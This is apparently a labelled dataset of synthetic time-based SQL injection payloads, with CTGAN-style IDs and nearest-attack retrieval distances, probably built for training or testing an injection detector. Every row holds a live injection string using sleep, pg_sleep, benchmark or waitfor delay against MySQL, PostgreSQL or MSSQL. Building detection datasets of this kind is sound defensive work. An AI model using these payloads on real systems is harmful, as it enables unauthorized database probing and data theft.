id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000175,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,5.729034709089594
CTGAN_000176,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000160,6.818710254887155
CTGAN_000177,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000292,5.573875614615752
CTGAN_000178,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000149,5.974314613038891
CTGAN_000179,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",nearest_attack_euclidean,R000273,5.818879583928462
CTGAN_000180,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,5.426169932153721
CTGAN_000181,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000116,6.180434376276483
CTGAN_000182,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000138,6.421132491937818
CTGAN_000183,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000249,5.684915783134124
CTGAN_000184,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,4.867883913591388
CTGAN_000185,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,7.2465191396578135
CTGAN_000186,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000138,5.224596000816442
CTGAN_000187,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000200,7.624371094909082
CTGAN_000188,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000157,5.769826995665234
CTGAN_000189,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000126,6.513137120420823
CTGAN_000190,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000123,5.724275203104793
CTGAN_000191,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000168,4.4009776818209625
CTGAN_000192,attack,time,"1""  )   as yzny where 4869  =  4869 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",nearest_attack_euclidean,R000265,5.859933580834478
CTGAN_000193,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R000287,6.353617711058387
CTGAN_000194,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000020,5.598380785842798
CTGAN_000195,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000020,5.958629481100544
CTGAN_000196,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000008,8.011041135116878
CTGAN_000197,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000279,5.664481181043387
CTGAN_000198,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,6.265098750777622
CTGAN_000199,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000199,5.405771246794958
CTGAN_000200,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,5.188529333134055
